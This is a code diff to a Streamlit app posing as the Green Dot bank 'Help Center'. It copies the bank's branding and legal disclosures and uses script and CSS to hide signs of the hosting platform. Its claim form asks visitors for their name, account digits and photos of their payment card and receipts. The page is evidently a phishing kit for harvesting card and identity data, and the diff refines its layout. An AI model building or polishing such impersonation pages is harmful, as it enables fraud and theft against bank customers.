@@ -21,9 +21,9 @@ def init_db():
 
 init_db()
 
-st.set_page_config(page_title="Green Dot | Help Center", layout="wide", page_icon="✅")
+st.set_page_config(page_title="Green Dot | Help Center", layout="centered", page_icon="✅")
 
-# 1. JS: ELIMINACIÓN AGRESIVA DE ELEMENTOS HOSTING
+# 1. JS: LIMPIEZA DE INTERFAZ
 st.markdown("""<script>
     const cleanDOM = () => {
         const selectors = [
@@ -37,45 +37,66 @@ st.markdown("""<script>
     setInterval(cleanDOM, 500);
 </script>""", unsafe_allow_html=True)
 
-# 2. CSS: WHITE LABEL TOTAL
+# 2. CSS: DISEÑO COMPACTO Y CENTRALIZADO
 st.markdown("""<style>
-/* Ocultar elementos de Streamlit */
-header, footer, [data-testid='stHeader'], .stDeployButton, .section-anchor { 
-    display: none !important; 
-    visibility: hidden !important; 
-}
+header, footer, [data-testid='stHeader'], .stDeployButton, .section-anchor { display: none !important; }
 
-/* Bloqueo absoluto de links en Logo y Encabezados */
-[data-testid="stImage"], [data-testid="stImage"] img, h1, h2, h3, .stMarkdown h1, .stMarkdown h2 {
+[data-testid="stImage"], [data-testid="stImage" ] img, h1, h2, h3, .stMarkdown h1, .stMarkdown h2 {
     pointer-events: none !important;
     cursor: default !important;
     user-select: none !important;
-    text-decoration: none !important;
 }
 
 .stApp { background-color: #000000 !important; color: #FFFFFF !important; }
-.block-container { padding-top: 1rem !important; }
-.stButton>button { background-color: #00a05b !important; color: white !important; width: 100%; padding: 15px !important; font-weight: bold !important; border: none !important; }
 
-/* Estilo App Store Section */
-.promo-box { background-color: #111; padding: 40px; text-align: center; border-radius: 12px; margin: 30px 0; border: 1px solid #222; }
+.block-container {
+    max-width: 550px !important;
+    padding-top: 2rem !important;
+}
 
-/* Footer Legal */
-.legal-footer { font-size: 11px; color: #666; text-align: justify; margin-top: 60px; border-top: 1px solid #222; padding-top: 20px; line-height: 1.5; }
+.stButton>button {
+    background-color: #00a05b !important;
+    color: white !important;
+    width: 100%;
+    padding: 12px !important;
+    font-weight: bold !important;
+    border: none !important;
+}
+
+.promo-box {
+    background-color: #111; 
+    padding: 30px; 
+    text-align: center; 
+    border-radius: 12px; 
+    margin: 25px 0; 
+    border: 1px solid #222;
+}
+
+.legal-footer {
+    font-size: 10px;
+    color: #555;
+    text-align: justify;
+    margin-top: 50px;
+    border-top: 1px solid #222;
+    padding-top: 20px;
+    line-height: 1.4;
+}
 </style>""", unsafe_allow_html=True)
 
-# Logo
-if os.path.exists('logo.svg'):
-    st.image('logo.svg', width=250)
+# Logo centralizado
+col1, col2, col3 = st.columns([1,2,1])
+with col2:
+    if os.path.exists('logo.svg'):
+        st.image('logo.svg', use_container_width=True)
 
 st.title("Help Center")
 st.write("Please fill out the form below to submit your claim.")
 
-with st.form("claim_form_v21", clear_on_submit=True):
+with st.form("compact_form_v21", clear_on_submit=True):
     nombre = st.text_input("Full Name")
     cuenta = st.text_input("Last 4 digits of Account")
     monto = st.number_input("Disputed Amount", min_value=0.0, format="%.2f")
-    st.markdown("**Upload Evidence**")
+    st.markdown("**Evidence**")
     rec = st.file_uploader("Receipt Photo", type=['jpg','png','jpeg'])
     car = st.file_uploader("Card Photo", type=['jpg','png','jpeg'])
     submitted = st.form_submit_button("SUBMIT NOW")
@@ -83,20 +104,16 @@ with st.form("claim_form_v21", clear_on_submit=True):
 if submitted:
     if nombre and rec and car: st.success("✅ Claim received.")
 
-# Promo App
 st.markdown("""<div class='promo-box'>
-    <h2 style='color:white; margin-bottom:20px;'>Download the Green Dot app</h2>
-    <div style='display: flex; justify-content: center; gap: 20px; flex-wrap: wrap; margin-bottom: 25px;'>
-        <img src='https://www.greendot.com/content/dam/greendot/home-page-redesign/Play-store.svg' width='160'>
-        <img src='https://www.greendot.com/content/dam/greendot/home-page-redesign/App-store.svg' width='160'>
+    <h3 style='color:white; margin-bottom:15px;'>Download the Green Dot app</h3>
+    <div style='display: flex; justify-content: center; gap: 15px; flex-wrap: wrap; margin-bottom: 20px;'>
+        <img src='https://www.greendot.com/content/dam/greendot/home-page-redesign/Play-store.svg' width='130'>
+        <img src='https://www.greendot.com/content/dam/greendot/home-page-redesign/App-store.svg' width='130'>
     </div>
-    <p style='color:#bbb; max-width:600px; margin: 0 auto;'>We offer secure mobile banking that allows you to conveniently manage your account.</p>
+    <p style='color:#888; font-size: 13px;'>Secure mobile banking for your account.</p>
 </div>""", unsafe_allow_html=True)
 
-# Footer Legal Completo
 st.markdown("""<div class='legal-footer'>
-    * When on a desktop, hover over * to view important disclosures. When on a mobile device, tap on * to view disclosures.<br><br>
-    Not a gift card. Must be 18 or older to purchase. Online access, mobile number verification (via text message) and identity verification (including SSN) are required to open and use your account. Mobile number verification, email address verification and mobile app are required to access all features.<br><br>
-    Green Dot® cards are issued by Green Dot Bank, Member FDIC, pursuant to a license from Visa U.S.A., Inc. Visa is a registered trademark of Visa International Service Association. And by Mastercard International Inc. Mastercard and the circles design are registered trademarks of Mastercard International Incorporated.<br><br>
-    ©2026 Green Dot Corporation. All rights reserved. Green Dot Corporation NMLS #914924; Green Dot Bank NMLS #908739.
+    Not a gift card. Must be 18 or older to purchase. Online access and identity verification are required. 
+    Green Dot® cards are issued by Green Dot Bank, Member FDIC. ©2026 Green Dot Corporation. NMLS #914924.
 </div>""", unsafe_allow_html=True)
